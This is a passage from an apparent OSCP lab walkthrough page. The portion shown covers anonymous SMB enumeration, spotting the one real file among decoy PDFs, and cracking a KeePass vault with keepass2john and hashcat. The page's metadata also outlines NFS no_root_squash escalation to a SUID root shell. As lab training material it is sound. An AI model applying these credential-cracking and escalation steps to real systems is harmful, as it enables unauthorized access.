@@ -1,0 +1,1623 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>172.16.97.110 — SMB → KeePass → NFS root · Linux set 2 walkthrough</title>
+<meta name="description" content="Walkthrough of an OSCP Linux box: anonymous Samba, a Backup share of decoy PDFs and a KeePass database, hashcat mode 13400, pykeepass, SSH as matt, and an NFS export with no_root_squash reached through an SSH tunnel to produce a root-owned SUID binary.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="172.16.97.110 — SMB → KeePass → NFS root · Linux set 2 walkthrough">
+<meta property="og:description" content="smbclient → keys.kdbx → keepass2john → hashcat -m 13400 → pykeepass → ssh matt → /etc/exports → no_root_squash → mount denied → insecure → ssh -L 2049 → mount 127.0.0.1:/usr/upload → shell.c → chmod +s → root → proof.txt.">
+<meta name="color-scheme" content="dark light">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💀</text></svg>">
+<style>
+*,*::before,*::after{box-sizing:border-box}
+:root{
+  --bg:#0a0e13; --bg2:#0f151d; --panel:#0d131b; --line:#1c2836; --line2:#263545;
+  --fg:#dde5ee; --dim:#8697ab; --dim2:#5d6d80;
+  --acc:#3fb950; --acc-dim:#1f6f31; --amber:#d29922; --red:#f85149; --link:#58a6ff;
+  --code:#070a0e; --shadow:0 20px 50px rgba(0,0,0,.45);
+  --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,"Liberation Mono",monospace;
+  --sans:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,Helvetica,Arial,sans-serif;
+}
+[data-theme="light"]{
+  --bg:#f4f6f9; --bg2:#ffffff; --panel:#ffffff; --line:#e3e8ef; --line2:#d3dae4;
+  --fg:#151b23; --dim:#5a6675; --dim2:#7d8898;
+  --acc:#1a7f37; --acc-dim:#8fd19e; --amber:#9a6700; --red:#cf222e; --link:#0969da;
+  --code:#0d1117; --shadow:0 16px 40px rgba(15,25,40,.10);
+}
+html{scroll-behavior:smooth}
+body{
+  margin:0;background:var(--bg);color:var(--fg);font-family:var(--sans);
+  font-size:16px;line-height:1.62;-webkit-font-smoothing:antialiased;
+}
+a{color:var(--link);text-decoration:none}
+a:hover{text-decoration:underline}
+code{font-family:var(--mono);font-size:.88em}
+.skip{position:absolute;left:-9999px;top:0;background:var(--acc);color:#04120a;padding:10px 16px;z-index:99}
+.skip:focus{left:8px;top:8px}
+
+/* ---------- top bar ---------- */
+.topbar{
+  position:sticky;top:0;z-index:40;display:flex;align-items:center;gap:14px;
+  padding:10px 18px;background:color-mix(in srgb,var(--bg) 88%,transparent);
+  backdrop-filter:blur(14px);border-bottom:1px solid var(--line);
+}
+.brand{display:flex;align-items:center;gap:9px;font-weight:700;letter-spacing:.02em;white-space:nowrap}
+.brand .dot{width:9px;height:9px;border-radius:50%;background:var(--acc);box-shadow:0 0 12px var(--acc)}
+.brand .slash{color:var(--dim2);font-weight:400}
+.brand-sub{color:var(--dim);font-weight:500}
+.toplink{padding:6px 11px;border-radius:9px;color:var(--dim);font-size:13.5px;white-space:nowrap}
+.toplink:hover{background:var(--bg2);color:var(--fg);text-decoration:none}
+.search-wrap{position:relative;flex:1;max-width:460px;margin-left:auto}
+#search{
+  width:100%;padding:9px 13px;border-radius:10px;border:1px solid var(--line2);
+  background:var(--bg2);color:var(--fg);font-family:var(--sans);font-size:14px;outline:none;
+}
+#search:focus{border-color:var(--acc);box-shadow:0 0 0 3px color-mix(in srgb,var(--acc) 18%,transparent)}
+.search-count{position:absolute;right:10px;top:50%;transform:translateY(-50%);font-size:11px;color:var(--dim2)}
+.icon-btn{
+  background:var(--bg2);border:1px solid var(--line2);color:var(--fg);border-radius:10px;
+  width:38px;height:38px;font-size:16px;cursor:pointer;line-height:1;
+}
+.icon-btn:hover{border-color:var(--acc)}
+.burger{display:none;background:none;border:1px solid var(--line2);color:var(--fg);border-radius:9px;width:38px;height:38px;font-size:17px;cursor:pointer}
+
+/* ---------- shell ---------- */
+.shell{display:grid;grid-template-columns:296px minmax(0,1fr);gap:0;align-items:start}
+.sidebar{
+  position:sticky;top:59px;height:calc(100vh - 59px);overflow-y:auto;padding:20px 16px 60px;
+  border-right:1px solid var(--line);background:var(--bg);
+}
+.sidebar::-webkit-scrollbar{width:9px}
+.sidebar::-webkit-scrollbar-thumb{background:var(--line2);border-radius:9px}
+
+.card{border:1px solid var(--line);border-radius:14px;padding:14px;background:var(--panel);margin-bottom:16px}
+.card h3{margin:0 0 10px;font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--dim)}
+.progress-track{height:6px;border-radius:99px;background:var(--line);overflow:hidden}
+.progress-fill{height:100%;width:0;background:linear-gradient(90deg,var(--acc-dim),var(--acc));transition:width .35s ease}
+.progress-label{margin-top:9px;font-size:12px;color:var(--dim);display:flex;justify-content:space-between}
+.progress-label b{color:var(--fg)}
+
+.nav-title{font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--dim2);margin:4px 8px 8px}
+.nav-item{
+  display:grid;grid-template-columns:26px 1fr 20px;align-items:center;gap:8px;
+  padding:9px 10px;border-radius:10px;color:var(--fg);font-size:14px;
+  border:1px solid transparent;text-decoration:none;
+}
+.nav-item:hover{background:var(--bg2);text-decoration:none}
+.nav-item.active{background:color-mix(in srgb,var(--acc) 12%,transparent);border-color:color-mix(in srgb,var(--acc) 35%,transparent)}
+.nav-item.active .nav-num{color:var(--acc)}
+.nav-item.done .nav-label{color:var(--dim);text-decoration:line-through}
+.nav-num{font-family:var(--mono);font-size:11px;color:var(--dim2)}
+.nav-check{appearance:none;width:16px;height:16px;border:1.5px solid var(--line2);border-radius:5px;cursor:pointer;margin:0;background:transparent}
+.nav-check:checked{background:var(--acc);border-color:var(--acc)}
+.nav-check:checked::after{content:"✓";display:block;color:#04120a;font-size:12px;line-height:13px;text-align:center;font-weight:700}
+.nav-tools{display:flex;gap:8px;margin-top:12px}
+.ghost{
+  flex:1;background:var(--bg2);border:1px solid var(--line2);color:var(--dim);
+  padding:7px 10px;border-radius:9px;font-size:12px;cursor:pointer;font-family:var(--sans);
+}
+.ghost:hover{color:var(--fg);border-color:var(--acc)}
+.meta-line{display:flex;justify-content:space-between;gap:10px;font-size:12px;padding:5px 0;border-bottom:1px dashed var(--line)}
+.meta-line:last-child{border-bottom:0}
+.meta-line span:first-child{color:var(--dim)}
+.meta-line span:last-child{font-family:var(--mono);font-size:11px;text-align:right}
+
+/* ---------- main ---------- */
+main{padding:34px 36px 90px;max-width:1000px;width:100%}
+
+.hero{margin-bottom:38px}
+.eyebrow{font-size:11px;letter-spacing:.18em;text-transform:uppercase;color:var(--acc);margin-bottom:12px}
+.hero h1{margin:0;font-size:clamp(28px,4vw,44px);line-height:1.12;letter-spacing:-.025em;font-family:var(--sans)}
+.hero h1 .ip{font-family:var(--mono);font-weight:600;font-size:.9em;letter-spacing:-.045em}
+.hero h1 .name{color:var(--dim);font-weight:500}
+.lede{color:var(--dim);font-size:17px;max-width:68ch;margin:14px 0 18px}
+.badges{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:22px}
+.badge{
+  font-size:12px;padding:5px 11px;border-radius:99px;border:1px solid var(--line2);
+  color:var(--dim);background:var(--bg2);font-family:var(--mono);
+}
+.badge.ok{color:var(--acc);border-color:color-mix(in srgb,var(--acc) 40%,transparent);background:color-mix(in srgb,var(--acc) 9%,transparent)}
+.badge.warn{color:var(--amber);border-color:color-mix(in srgb,var(--amber) 40%,transparent);background:color-mix(in srgb,var(--amber) 9%,transparent)}
+
+.chain{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:8px;margin:8px 0 6px}
+.step{
+  position:relative;display:flex;flex-direction:column;gap:3px;padding:12px;border-radius:12px;
+  border:1px solid var(--line);background:var(--panel);color:var(--fg);text-decoration:none;
+  transition:transform .15s ease,border-color .15s ease;
+}
+.step:hover{transform:translateY(-2px);border-color:var(--acc);text-decoration:none}
+.step-num{font-family:var(--mono);font-size:10px;color:var(--acc)}
+.step-label{font-weight:650;font-size:14px}
+.step-desc{font-size:11.5px;color:var(--dim);line-height:1.45}
+.step-desc code{font-size:11px;background:var(--code);padding:1px 4px;border-radius:4px;color:#c9d5e4}
+
+.flags{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:12px;margin:26px 0 10px}
+.flag{border:1px solid var(--line);border-radius:14px;padding:16px;background:var(--panel)}
+.flag .k{font-size:11px;letter-spacing:.12em;text-transform:uppercase;color:var(--dim2);margin-bottom:8px}
+.flag .v{font-family:var(--mono);font-size:14px;word-break:break-all;min-height:22px}
+.flag.revealed .v{color:var(--acc)}
+.flag .reveal{margin-top:10px;background:none;border:0;color:var(--link);font-size:12px;cursor:pointer;padding:0}
+.flag .masked{letter-spacing:.18em;color:var(--dim2)}
+
+/* ---------- chapters ---------- */
+.chapter{scroll-margin-top:78px;margin:0 0 34px;border-top:1px solid var(--line);padding-top:26px}
+.ch-head{display:flex;align-items:flex-start;gap:14px;margin-bottom:6px}
+.ch-num{
+  font-family:var(--mono);font-size:12px;color:var(--acc);border:1px solid color-mix(in srgb,var(--acc) 35%,transparent);
+  background:color-mix(in srgb,var(--acc) 9%,transparent);border-radius:9px;padding:6px 9px;flex:none;
+}
+.ch-title{flex:1;min-width:0}
+.ch-title h2{margin:0;font-size:24px;letter-spacing:-.01em}
+.ch-sub{margin:2px 0 0;color:var(--dim);font-size:13.5px}
+.copyall{flex:none;max-width:140px}
+
+.content{font-size:15.3px}
+.content h3{font-size:18px;margin:0;letter-spacing:-.01em}
+.content h4{font-size:14px;margin:22px 0 8px;color:var(--dim);letter-spacing:.04em;text-transform:uppercase}
+.content p{margin:10px 0}
+.content ul,.content ol{padding-left:22px;margin:10px 0}
+.content li{margin:5px 0}
+.content strong{color:#fff}
+[data-theme="light"] .content strong{color:#000}
+.content code{
+  background:color-mix(in srgb,var(--line2) 42%,transparent);border:1px solid var(--line);
+  padding:.1em .36em;border-radius:5px;color:#e8eff8;white-space:nowrap;
+}
+[data-theme="light"] .content code{color:#0d1520;background:#edf1f6}
+.block pre code,.block pre span{background:none;border:0;padding:0}
+.content td code,.content li code{white-space:normal}
+.content hr{border:0;border-top:1px solid var(--line);margin:26px 0}
+.content blockquote{margin:14px 0;padding:10px 14px;border-left:3px solid var(--amber);background:color-mix(in srgb,var(--amber) 7%,transparent);border-radius:0 8px 8px 0;color:var(--dim)}
+.content blockquote p{margin:4px 0}
+
+.sec{border:1px solid var(--line);border-radius:12px;margin:14px 0;background:color-mix(in srgb,var(--panel) 60%,transparent);overflow:hidden}
+.sec-head{
+  width:100%;display:flex;align-items:center;gap:10px;background:none;border:0;color:var(--fg);
+  padding:12px 15px;font-size:17px;font-weight:650;cursor:pointer;text-align:left;font-family:var(--sans);
+}
+.sec-head:hover{background:var(--bg2)}
+.sec-head::before{content:"";flex:none;width:7px;height:7px;margin-top:-3px;border-right:1.7px solid var(--dim2);border-bottom:1.7px solid var(--dim2);transform:rotate(-45deg);transition:transform .18s ease}
+.sec-head[aria-expanded="true"]::before{transform:rotate(45deg);margin-top:-5px}
+.sec-body{padding:2px 15px 14px}
+.sec-body[hidden]{display:none}
+
+/* tables */
+table{border-collapse:collapse;width:100%;margin:14px 0;font-size:13.5px;display:block;overflow-x:auto}
+th,td{border:1px solid var(--line);padding:8px 11px;text-align:left;vertical-align:top}
+th{background:var(--bg2);font-weight:600;font-size:12px;letter-spacing:.04em;text-transform:uppercase;color:var(--dim)}
+tr:nth-child(even) td{background:color-mix(in srgb,var(--bg2) 55%,transparent)}
+
+/* code cards */
+.block{margin:12px 0;border:1px solid var(--line);border-radius:10px;overflow:hidden;background:var(--code)}
+.block-bar{
+  display:flex;align-items:center;justify-content:space-between;padding:6px 10px;
+  background:#0b1017;border-bottom:1px solid #16202c;
+}
+[data-theme="light"] .block-bar{background:#161b22;border-bottom-color:#232c38}
+.block-tag{font-family:var(--mono);font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:#5f7085}
+.block-cmd .block-tag{color:#3fb950}
+.copy{
+  background:#131c26;border:1px solid #24313f;color:#9fb0c3;border-radius:7px;
+  font-size:11px;padding:3px 9px;cursor:pointer;font-family:var(--sans);
+}
+.copy:hover{color:#fff;border-color:#3fb950}
+.copy.done{color:#3fb950;border-color:#3fb950}
+.block pre{margin:0;padding:13px 15px;overflow-x:auto;font-family:var(--mono);font-size:12.9px;line-height:1.6;color:#c9d5e4}
+.block-out{border-style:dashed}
+.block-out pre{color:#93a3b6}
+.codehilite{background:transparent}
+.codehilite pre{margin:0}
+.highlight .c,.highlight .c1,.highlight .cm{color:#5f7085;font-style:italic}
+.highlight .k,.highlight .kn,.highlight .kd{color:#d2a8ff}
+.highlight .s,.highlight .s1,.highlight .s2,.highlight .sb{color:#7ee787}
+.highlight .nb,.highlight .nf{color:#79c0ff}
+.highlight .nv,.highlight .vi{color:#ffa657}
+.highlight .mi,.highlight .m{color:#ffa657}
+.highlight .o,.highlight .p{color:#c9d5e4}
+.highlight .gp{color:#3fb950;font-weight:700}
+
+footer{margin-top:50px;padding-top:22px;border-top:1px solid var(--line);color:var(--dim2);font-size:12.5px;display:flex;flex-wrap:wrap;gap:14px;justify-content:space-between}
+
+/* toast + top button */
+#toast{
+  position:fixed;left:50%;bottom:26px;transform:translate(-50%,20px);opacity:0;pointer-events:none;
+  background:var(--acc);color:#04120a;padding:9px 16px;border-radius:99px;font-size:13px;font-weight:650;
+  transition:opacity .2s ease,transform .2s ease;z-index:60;
+}
+#toast.show{opacity:1;transform:translate(-50%,0)}
+#toTop{
+  position:fixed;right:22px;bottom:22px;width:42px;height:42px;border-radius:50%;
+  background:var(--panel);border:1px solid var(--line2);color:var(--fg);cursor:pointer;
+  opacity:0;pointer-events:none;transition:opacity .2s ease;z-index:50;font-size:16px;
+}
+#toTop.show{opacity:1;pointer-events:auto}
+#toTop:hover{border-color:var(--acc)}
+
+mark.hit{background:color-mix(in srgb,var(--amber) 45%,transparent);color:inherit;border-radius:3px}
+
+@media (max-width:940px){
+  .shell{grid-template-columns:1fr}
+  .sidebar{
+    position:fixed;inset:59px 0 0 0;height:auto;z-index:35;transform:translateX(-102%);
+    transition:transform .22s ease;width:296px;box-shadow:var(--shadow);
+  }
+  .sidebar.open{transform:none}
+  .burger{display:block}
+  main{padding:24px 18px 80px}
+  .search-wrap{max-width:none}
+  .copyall{display:none}
+  .brand-sub,.brand .slash{display:none}
+}
+@media print{
+  .topbar,.sidebar,#toTop,#toast,.copy,.copyall,.block-bar{display:none!important}
+  .shell{display:block}
+  main{padding:0;max-width:none}
+  body{background:#fff;color:#000}
+  .sec{border:0;margin:0}
+  .sec-head{font-size:14px}
+  .sec-body{display:block!important}
+}
+</style>
+</head>
+<body>
+<a class="skip" href="#main">Skip to content</a>
+
+<header class="topbar">
+  <button class="burger" id="burger" type="button" aria-label="Open navigation">☰</button>
+  <div class="brand"><span class="dot"></span>OSCP<span class="slash">/</span><span class="brand-sub">Linux set 2 · SMB → KeePass → NFS root</span></div>
+  <div class="search-wrap">
+    <input id="search" type="search" placeholder="Search chapters…   ( / )" autocomplete="off" aria-label="Search chapters">
+    <span class="search-count" id="searchCount"></span>
+  </div>
+  <button class="icon-btn" id="themeBtn" type="button" aria-label="Toggle colour theme" title="Toggle theme">◐</button>
+</header>
+
+<div class="shell">
+  <aside class="sidebar" id="sidebar">
+    <div class="card">
+      <h3>Progress</h3>
+      <div class="progress-track"><div class="progress-fill" id="bar"></div></div>
+      <div class="progress-label"><span><b id="pcount">0 / 9</b> chapters</span><span id="ppct">0%</span></div>
+    </div>
+
+    <div class="nav-title">Chapters</div>
+    <nav><a class="nav-item" href="#ch-01" data-target="ch-01"><span class="nav-num">01</span><span class="nav-label">Anonymous SMB</span><input class="nav-check" type="checkbox" data-ch="ch-01" aria-label="Mark Anonymous SMB complete"></a>
+<a class="nav-item" href="#ch-02" data-target="ch-02"><span class="nav-num">02</span><span class="nav-label">The KeePass vault</span><input class="nav-check" type="checkbox" data-ch="ch-02" aria-label="Mark The KeePass vault complete"></a>
+<a class="nav-item" href="#ch-03" data-target="ch-03"><span class="nav-num">03</span><span class="nav-label">SSH as matt</span><input class="nav-check" type="checkbox" data-ch="ch-03" aria-label="Mark SSH as matt complete"></a>
+<a class="nav-item" href="#ch-04" data-target="ch-04"><span class="nav-num">04</span><span class="nav-label">The export that ends the box</span><input class="nav-check" type="checkbox" data-ch="ch-04" aria-label="Mark The export that ends the box complete"></a>
+<a class="nav-item" href="#ch-05" data-target="ch-05"><span class="nav-num">05</span><span class="nav-label">Why the direct mount is refused</span><input class="nav-check" type="checkbox" data-ch="ch-05" aria-label="Mark Why the direct mount is refused complete"></a>
+<a class="nav-item" href="#ch-06" data-target="ch-06"><span class="nav-num">06</span><span class="nav-label">Through the tunnel</span><input class="nav-check" type="checkbox" data-ch="ch-06" aria-label="Mark Through the tunnel complete"></a>
+<a class="nav-item" href="#ch-07" data-target="ch-07"><span class="nav-num">07</span><span class="nav-label">A root-owned SUID binary</span><input class="nav-check" type="checkbox" data-ch="ch-07" aria-label="Mark A root-owned SUID binary complete"></a>
+<a class="nav-item" href="#ch-08" data-target="ch-08"><span class="nav-num">08</span><span class="nav-label">Methodology</span><input class="nav-check" type="checkbox" data-ch="ch-08" aria-label="Mark Methodology complete"></a>
+<a class="nav-item" href="#ch-09" data-target="ch-09"><span class="nav-num">09</span><span class="nav-label">Cheat sheet</span><input class="nav-check" type="checkbox" data-ch="ch-09" aria-label="Mark Cheat sheet complete"></a></nav>
+    <div class="nav-tools">
+      <button class="ghost" id="expandAll" type="button">Expand all</button>
+      <button class="ghost" id="collapseAll" type="button">Collapse all</button>
+    </div>
+    <div class="nav-tools"><button class="ghost" id="resetProgress" type="button">Reset progress</button></div>
+
+    <div class="card" style="margin-top:16px">
+      <h3>Target</h3>
+      <div class="meta-line"><span>Target</span><span>172.16.97.110 · Ubuntu 22.04 · oscp</span></div>
+      <div class="meta-line"><span>Second interface</span><span>192.168.97.110 · internal</span></div>
+      <div class="meta-line"><span>Services</span><span>22 SSH · 139/445 Samba 4.15.13 · 2049 NFS</span></div>
+      <div class="meta-line"><span>Access</span><span>anonymous SMB → KeePass → SSH as matt</span></div>
+      <div class="meta-line"><span>Escalation</span><span>/etc/exports → no_root_squash → SSH tunnel → SUID</span></div>
+      <div class="meta-line"><span>Result</span><span>local.txt + proof.txt · root</span></div>
+    </div>
+
+    <div class="card">
+      <h3>Source</h3>
+      <div class="meta-line"><span>Repo</span><span><a href="https://github.com/AV10V/OSCP">AV10V/OSCP</a></span></div>
+      <div class="meta-line"><span>Notes</span><span>markdown</span></div>
+      <div class="meta-line"><span>All labs</span><span><a href="../../main.html">main</a></span></div>
+    </div>
+  </aside>
+
+  <main id="main">
+    <section class="hero" id="overview">
+      <div class="eyebrow">OSCP lab walkthrough</div>
+      <h1><span class="ip">172.16.97.110</span> <span class="name">— Linux set 2 · SMB → KeePass → NFS root</span></h1>
+      <p class="lede">
+        One credential, one export line and two reasons a direct mount fails. The SMB stage is a lesson in ignoring decoys; the root stage is a lesson in reading a mount option and then satisfying the two conditions that stand between it and a shell.
+      </p>
+      <div class="badges">
+        <span class="badge">Ubuntu 22.04 · kernel 5.15.0-84</span>
+        <span class="badge">Samba 4.15.13 · anonymous Backup</span>
+        <span class="badge">KeePass 3.4 KB · hashcat 13400</span>
+        <span class="badge ok">matt · SSH · local.txt</span>
+        <span class="badge ok">/etc/exports · no_root_squash</span>
+        <span class="badge warn">export restricted to localhost</span>
+        <span class="badge ok">ssh -L 2049 → SUID root · proof.txt</span>
+      </div>
+      <div class="chain"><a class="step" href="#ch-01"><span class="step-num">01</span><span class="step-label">Recon</span><span class="step-desc">anonymous SMB on <code>.110</code></span></a>
+<a class="step" href="#ch-01"><span class="step-num">02</span><span class="step-label">Backup share</span><span class="step-desc">nine folders · 0-byte PDFs</span></a>
+<a class="step" href="#ch-02"><span class="step-num">03</span><span class="step-label">KeePass</span><span class="step-desc"><code>keys.kdbx</code> · 3.4 KB</span></a>
+<a class="step" href="#ch-02"><span class="step-num">04</span><span class="step-label">Crack</span><span class="step-desc"><code>hashcat -m 13400</code></span></a>
+<a class="step" href="#ch-02"><span class="step-num">05</span><span class="step-label">Vault</span><span class="step-desc"><code>pykeepass</code> → <code>matt</code></span></a>
+<a class="step" href="#ch-03"><span class="step-num">06</span><span class="step-label">SSH</span><span class="step-desc"><code>local.txt</code></span></a>
+<a class="step" href="#ch-04"><span class="step-num">07</span><span class="step-label">Enumerate</span><span class="step-desc">LinPEAS · <code>/etc/exports</code></span></a>
+<a class="step" href="#ch-04"><span class="step-num">08</span><span class="step-label">Export</span><span class="step-desc"><code>no_root_squash</code></span></a>
+<a class="step" href="#ch-05"><span class="step-num">09</span><span class="step-label">Denied</span><span class="step-desc">direct mount refused</span></a>
+<a class="step" href="#ch-05"><span class="step-num">10</span><span class="step-label">insecure</span><span class="step-desc"><code>adm</code>-writable export file</span></a>
+<a class="step" href="#ch-06"><span class="step-num">11</span><span class="step-label">Tunnel</span><span class="step-desc"><code>ssh -L 2049</code></span></a>
+<a class="step" href="#ch-06"><span class="step-num">12</span><span class="step-label">Mount</span><span class="step-desc"><code>127.0.0.1:/usr/upload</code></span></a>
+<a class="step" href="#ch-07"><span class="step-num">13</span><span class="step-label">SUID</span><span class="step-desc">root · <code>proof.txt</code></span></a></div>
+      <div class="flags">
+        <div class="flag">
+          <div class="k">local.txt · /home/matt</div>
+          <div class="v" data-value="[redacted]"><span class="masked">••••••••••••••••••••••••••••••••</span></div>
+          <button class="reveal" type="button">reveal</button>
+        </div>
+        <div class="flag">
+          <div class="k">proof.txt · /root</div>
+          <div class="v" data-value="[redacted]"><span class="masked">••••••••••••••••••••••••••••••••</span></div>
+          <button class="reveal" type="button">reveal</button>
+        </div>
+      </div>
+    </section>
+
+    <section class="chapter" id="ch-01" data-title="Anonymous SMB"><div class="ch-head"><span class="ch-num">01</span><div class="ch-title"><h2>Anonymous SMB</h2><p class="ch-sub">Nine folders and one file with content</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>The host exposes three services: SSH, Samba and NFS. Samba answers first, and it answers without a
+password.</p>
+<h3>1.1 The share list</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>smbclient<span class="w"> </span>-L<span class="w"> </span>//172.16.97.110
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>Password for [WORKGROUP\kali]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        Backup          Disk      Backup Files
+        IPC$            IPC       IPC Service (Samba 4.15.13-Ubuntu)
+Reconnecting with SMB1 for workgroup listing.
+Unable to connect with SMB1 -- no workgroup available
+</pre></div>
+<p>An empty password was accepted. <code>Backup</code> is a real share with a comment that describes exactly what
+it holds, and the Samba version confirms an Ubuntu 22.04 host — worth noting for the kernel
+version later.</p>
+<p>The SMB1 warning comes from <code>smbclient</code> trying to list the workgroup after the share list. It is not
+an error on the target and not a reason to change anything: the share listing already succeeded.</p>
+<h3>1.2 Inside the share</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>smbclient<span class="w"> </span>//172.16.97.110/Backup
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>Password for [WORKGROUP\kali]:
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Mon Feb 13 12:27:41 2023
+  ..                                  D        0  Tue Jul 21 16:34:09 2023
+  folder2                             D        0  Sun Jul 26 16:35:03 2023
+  folder1                             D        0  Tue Apr 11 18:39:22 2023
+  folder3                             D        0  Mon Feb 13 12:27:41 2023
+  folder4                             D        0  Mon Feb 13 12:27:41 2023
+  folder5                             D        0  Mon Feb 13 12:27:41 2023
+  folder6                             D        0  Mon Feb 13 12:27:41 2023
+  folder7                             D        0  Mon Feb 13 12:27:41 2023
+  folder8                             D        0  Mon Feb 13 12:27:41 2023
+  folder9                             D        0  Mon Feb 13 12:27:41 2023
+
+                42885120 blocks of size 4096. 14881285 blocks available
+</pre></div>
+<p>Nine folders, no obvious theme. Pulling the whole tree is cheaper than opening them one by one:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>smb: \&gt; tarmode
+tarmode is now full, system, hidden, nonroot, noacls
+smb: \&gt; recurse on
+smb: \&gt; prompt off
+smb: \&gt; mget *
+</pre></div>
+<h3>1.3 What is actually in there</h3>
+<p>Every PDF in the tree is empty — 0 bytes, all of them:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>$ ls -lR
+...
+./folder1:
+total 0
+-rw-r--r-- 1 kali kali  0 Feb 13  2023 doc142.pdf
+-rw-r--r-- 1 kali kali  0 Feb 13  2023 doc287.pdf
+-rw-r--r-- 1 kali kali  0 Feb 13  2023 notes.pdf
+...
+./folder5:
+total 4
+-rw-r--r-- 1 kali kali  0 Feb 13  2023 doc345.pdf
+-rw-r--r-- 1 kali kali  0 Feb 13  2023 important.pdf
+-rw-r--r-- 1 kali kali  0 Feb 13  2023 departments.xlsx
+-rw-r--r-- 1 kali kali 3484 Feb 13  2023 keys.kdbx
+</pre></div>
+<p>That listing is the whole box in one screen. Nine folders of decoy documents, all zero bytes, and a
+single file with content: a KeePass database.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>find<span class="w"> </span>.<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-size<span class="w"> </span>+0<span class="w"> </span>-printf<span class="w"> </span><span class="s1">'%s\t%p\n'</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>3484	./folder5/keys.kdbx
+</pre></div>
+<h3>1.4 Why the decoys work</h3>
+<p>A share called <code>Backup</code>, nine folders, and files named <code>important.pdf</code>, <code>finances.pdf</code>,
+<code>departments.xlsx</code> invite exactly the wrong behaviour: open each one, look for a password, waste the
+hour. The files are empty on purpose.</p>
+<p>The useful habit is mechanical: <strong>sort by size, ignore the zero-byte noise, and look at what is
+left.</strong> One <code>find -size +0</code> removes the entire distraction layer.</p>
+<table>
+<thead>
+<tr>
+<th>Observation</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Backup</code> share, anonymous</td>
+<td>no credential needed to read the whole thing</td>
+</tr>
+<tr>
+<td>nine folders of 0-byte PDFs</td>
+<td>deliberate noise</td>
+</tr>
+<tr>
+<td>one 3.4 KB <code>keys.kdbx</code></td>
+<td>a KeePass vault — cracking target</td>
+</tr>
+</tbody>
+</table>
+<h3>1.5 The host itself</h3>
+<p>The same machine answers on a second address. Once there is a shell on it (chapter 03), the interface
+list explains the address the SMB client reported:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>matt@oscp:~$ ip -br a
+lo               UNKNOWN        127.0.0.1/8
+ens160           UP             172.16.97.110/24
+ens192           UP             192.168.97.110/24
+</pre></div>
+<p>Two interfaces: <code>172.16.97.110</code> on the exam network and <code>192.168.97.110</code> on an internal one. The SMB
+client's warning about <code>192.168.97.110</code> was the server reporting its other address, not a second host.</p>
+<hr />
+<p><strong>Next:</strong> <a href="#ch-02"><code>02-keepass.md</code></a></p></div></section>
+<section class="chapter" id="ch-02" data-title="The KeePass vault"><div class="ch-head"><span class="ch-num">02</span><div class="ch-title"><h2>The KeePass vault</h2><p class="ch-sub">keepass2john, hashcat, pykeepass</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>A KeePass database is an encrypted XML container. <code>keepass2john</code> turns the header into a hash that
+<code>hashcat</code> mode <code>13400</code> understands, and <code>rockyou.txt</code> does the rest.</p>
+<h3>2.1 Extract the hash</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>keepass2john<span class="w"> </span>keys.kdbx<span class="w"> </span>&gt;<span class="w"> </span>keepass.hash
+cat<span class="w"> </span>keepass.hash
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>keys:$keepass$*2*6000*0*[redacted]*[redacted]*[redacted]*[redacted]*[redacted]*[redacted]
+</pre></div>
+<p>The fields encode the KDBX version, the transformation rounds and the master seed. Nothing here is
+useful without the master password, which is the point.</p>
+<h3>2.2 Crack it</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13400</span><span class="w"> </span>keepass.hash<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>hashcat (v6.2.6) starting
+...
+KEEPFILE: Mode 13400 (KeePass 1/2)
+...
+Recovered........: 1/1 (100.00%) Digests
+</pre></div>
+<p><code>-m 13400</code> is the only detail that matters: without it <code>hashcat</code> either refuses the hash or runs the
+wrong algorithm at a fraction of the speed. KeePass is deliberately slow to guess, which is why the
+recovered password is a predictable one rather than a random string.</p>
